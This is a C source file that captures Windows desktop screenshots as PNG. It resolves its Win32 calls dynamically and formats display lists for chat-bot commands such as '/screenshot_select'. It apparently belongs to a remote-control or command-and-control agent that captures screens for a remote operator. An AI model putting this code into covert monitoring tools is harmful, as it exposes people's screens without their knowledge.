/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#ifdef _WIN32

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "screenshot.h"
#include "screenshot_png.h"
#include "../logging/logging.h"
#include "../win32/win32_api.h"

#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_WIN_DISPLAYS 16

typedef struct {
  int id;
  RECT rect;
  int is_primary;
  char name[64];
} win_display_info_t;

static win_display_info_t win_displays[MAX_WIN_DISPLAYS];
static int win_display_count = 0;
static char selected_display_target[64] = "all";
static int selected_display_index = -1;

static BOOL CALLBACK MonitorEnumProc(HMONITOR hMon, HDC hdcMon, LPRECT lprcMon, LPARAM dwData) {
  (void)hdcMon;
  (void)dwData;
  if (win_display_count >= MAX_WIN_DISPLAYS) return FALSE;

  MONITORINFOEX mi;
  ZeroMemory(&mi, sizeof(mi));
  mi.cbSize = sizeof(mi);

  if (g_c2t_win32.GetMonitorInfoA && g_c2t_win32.GetMonitorInfoA(hMon, (LPMONITORINFO)&mi)) {
    win_displays[win_display_count].id = win_display_count;
    win_displays[win_display_count].rect = mi.rcMonitor;
    win_displays[win_display_count].is_primary = (mi.dwFlags & MONITORINFOF_PRIMARY) != 0;
    snprintf(win_displays[win_display_count].name,
             sizeof(win_displays[win_display_count].name),
             "Display %d (%s)", win_display_count, mi.szDevice);
    win_display_count++;
  }
  return TRUE;
}

static void refresh_windows_displays(void) {
  c2t_win32_api_init();
  win_display_count = 0;
  if (g_c2t_win32.EnumDisplayMonitors) {
    g_c2t_win32.EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, 0);
  }
}

int screenshot_capture_windows_display(const char *target,
                                      void **out_data, size_t *out_size,
                                      const char **out_mime_type,
                                      const char **out_filename) {
  if (!out_data || !out_size || !out_mime_type || !out_filename) {
    return 0;
  }
  *out_data = NULL;
  *out_size = 0;

  c2t_win32_api_init();
  if (!g_c2t_win32.GetDC || !g_c2t_win32.ReleaseDC || !g_c2t_win32.CreateCompatibleDC ||
      !g_c2t_win32.CreateCompatibleBitmap || !g_c2t_win32.SelectObject ||
      !g_c2t_win32.BitBlt || !g_c2t_win32.GetDIBits || !g_c2t_win32.DeleteObject || !g_c2t_win32.DeleteDC) {
    c2t_log_warning("screenshot", "Required GDI/User32 dynamic procedures unavailable in win32_api");
    return 0;
  }

  refresh_windows_displays();

  int target_idx = -1;
  if (target && *target && strcmp(target, "all") != 0 && strcmp(target, "*") != 0) {
    target_idx = atoi(target);
  }

  int x, y, width, height;

  if (target_idx >= 0 && target_idx < win_display_count) {
    x = win_displays[target_idx].rect.left;
    y = win_displays[target_idx].rect.top;
    width = win_displays[target_idx].rect.right - win_displays[target_idx].rect.left;
    height = win_displays[target_idx].rect.bottom - win_displays[target_idx].rect.top;
  } else if (g_c2t_win32.GetSystemMetrics) {
    x = g_c2t_win32.GetSystemMetrics(SM_XVIRTUALSCREEN);
    y = g_c2t_win32.GetSystemMetrics(SM_YVIRTUALSCREEN);
    width = g_c2t_win32.GetSystemMetrics(SM_CXVIRTUALSCREEN);
    height = g_c2t_win32.GetSystemMetrics(SM_CYVIRTUALSCREEN);
  } else {
    x = 0;
    y = 0;
    width = 1920;
    height = 1080;
  }

  if ((width <= 0 || height <= 0) && g_c2t_win32.GetSystemMetrics) {
    width = g_c2t_win32.GetSystemMetrics(SM_CXSCREEN);
    height = g_c2t_win32.GetSystemMetrics(SM_CYSCREEN);
    x = 0;
    y = 0;
  }

  if (width <= 0 || height <= 0) {
    c2t_log_warning("screenshot", "Invalid Windows screen dimensions (%dx%d)", width, height);
    return 0;
  }

  HDC screen = g_c2t_win32.GetDC(NULL);
  if (!screen) {
    c2t_log_warning("screenshot", "GetDC failed via win32_api");
    return 0;
  }

  HDC memory = g_c2t_win32.CreateCompatibleDC(screen);
  HBITMAP bitmap = g_c2t_win32.CreateCompatibleBitmap(screen, width, height);
  if (!memory || !bitmap) {
    c2t_log_warning("screenshot", "GDI DC or bitmap creation failed via win32_api");
    if (bitmap) g_c2t_win32.DeleteObject(bitmap);
    if (memory) g_c2t_win32.DeleteDC(memory);
    g_c2t_win32.ReleaseDC(NULL, screen);
    return 0;
  }

  HGDIOBJ prev = g_c2t_win32.SelectObject(memory, bitmap);
  if (!g_c2t_win32.BitBlt(memory, 0, 0, width, height, screen, x, y, SRCCOPY | CAPTUREBLT)) {
    c2t_log_warning("screenshot", "BitBlt failed via win32_api");
    g_c2t_win32.SelectObject(memory, prev);
    g_c2t_win32.DeleteObject(bitmap);
    g_c2t_win32.DeleteDC(memory);
    g_c2t_win32.ReleaseDC(NULL, screen);
    return 0;
  }

  BITMAPINFO bmi;
  ZeroMemory(&bmi, sizeof(bmi));
  bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
  bmi.bmiHeader.biWidth = width;
  bmi.bmiHeader.biHeight = -height; /* Top-down BMP */
  bmi.bmiHeader.biPlanes = 1;
  bmi.bmiHeader.biBitCount = 32;
  bmi.bmiHeader.biCompression = BI_RGB;

  size_t image_size = (size_t)width * (size_t)height * 4U;
  unsigned char *pixels = (unsigned char *)malloc(image_size);
  if (!pixels) {
    c2t_log_error("screenshot", "Out of memory allocating raw pixel buffer (%zu bytes)", image_size);
    g_c2t_win32.SelectObject(memory, prev);
    g_c2t_win32.DeleteObject(bitmap);
    g_c2t_win32.DeleteDC(memory);
    g_c2t_win32.ReleaseDC(NULL, screen);
    return 0;
  }

  if (!g_c2t_win32.GetDIBits(memory, bitmap, 0, (UINT)height, pixels, &bmi, DIB_RGB_COLORS)) {
    c2t_log_warning("screenshot", "GetDIBits failed via win32_api");
    free(pixels);
    g_c2t_win32.SelectObject(memory, prev);
    g_c2t_win32.DeleteObject(bitmap);
    g_c2t_win32.DeleteDC(memory);
    g_c2t_win32.ReleaseDC(NULL, screen);
    return 0;
  }

  g_c2t_win32.SelectObject(memory, prev);
  g_c2t_win32.DeleteObject(bitmap);
  g_c2t_win32.DeleteDC(memory);
  g_c2t_win32.ReleaseDC(NULL, screen);

  void *png_buf = NULL;
  size_t png_size = 0;
  if (!screenshot_encode_png_rgba((uint32_t)width, (uint32_t)height, pixels, 1, &png_buf, &png_size)) {
    c2t_log_warning("screenshot", "PNG encoding failed for Windows screenshot");
    free(pixels);
    return 0;
  }
  free(pixels);

  *out_data = png_buf;
  *out_size = png_size;
  *out_mime_type = "image/png";
  *out_filename = "screenshot.png";
  c2t_log_info("screenshot", "Captured %dx%d Windows desktop screenshot (%zu bytes PNG)", width, height, png_size);
  return 1;
}

int screenshot_capture_windows(void **out_data, size_t *out_size,
                               const char **out_mime_type,
                               const char **out_filename) {
  return screenshot_capture_display("all", out_data, out_size, out_mime_type, out_filename);
}

int screenshot_get_display_list(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0) return 0;
  refresh_windows_displays();

  if (win_display_count == 0) {
    snprintf(buffer, max_len,
             "🖥️ <b>Connected Displays (Windows):</b>\n\n"
             "• <b>[all]</b> <i>Virtual Desktop / Primary Screen</i> — 🟢 <b>ACTIVE</b>\n\n"
             "🎯 <b>Current Target:</b> <code>%s</code>\n"
             "💡 <i>Select display with <code>/screenshot_select &lt;id|all&gt;</code></i>",
             selected_display_target);
    return 1;
  }

  size_t offset = (size_t)snprintf(
      buffer, max_len, "🖥️ <b>Detected Displays (%d):</b>\n\n", win_display_count);

  for (int i = 0; i < win_display_count && offset + 128 < max_len; ++i) {
    int w = win_displays[i].rect.right - win_displays[i].rect.left;
    int h = win_displays[i].rect.bottom - win_displays[i].rect.top;
    int active = (selected_display_index == i) || (selected_display_index == -1);

    offset += (size_t)snprintf(
        buffer + offset, max_len - offset,
        "• <b>[%d]</b> <code>%s</code> (%dx%d)%s\n"
        "  Status: %s\n",
        win_displays[i].id, win_displays[i].name, w, h,
        win_displays[i].is_primary ? " 🌟 <i>Primary</i>" : "",
        active ? "🟢 <b>ACTIVE</b>" : "⚪ <i>IDLE</i>");
  }

  if (offset + 128 < max_len) {
    snprintf(buffer + offset, max_len - offset,
             "\n🎯 <b>Current Target:</b> <code>%s</code>\n"
             "💡 <i>Select display with <code>/screenshot_select &lt;id|all&gt;</code></i>",
             selected_display_target);
  }
  return 1;
}

int screenshot_select_display(const char *target) {
  if (!target || !*target || strcmp(target, "all") == 0 || strcmp(target, "*") == 0) {
    selected_display_index = -1;
    snprintf(selected_display_target, sizeof(selected_display_target), "all");
  } else {
    int is_num = 1;
    for (const char *p = target; *p; ++p) {
      if (!isdigit((unsigned char)*p)) {
        is_num = 0;
        break;
      }
    }
    if (is_num) {
      selected_display_index = atoi(target);
      snprintf(selected_display_target, sizeof(selected_display_target), "%d", selected_display_index);
    } else {
      selected_display_index = -1;
      snprintf(selected_display_target, sizeof(selected_display_target), "%s", target);
    }
  }
  c2t_log_info("screenshot", "Selected Windows display target '%s'", selected_display_target);
  return 1;
}

void screenshot_get_selected_display(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0) return;
  snprintf(buffer, max_len, "%s", selected_display_target);
}

int screenshot_get_display_count(void) {
  refresh_windows_displays();
  return win_display_count > 0 ? win_display_count : 1;
}

#endif
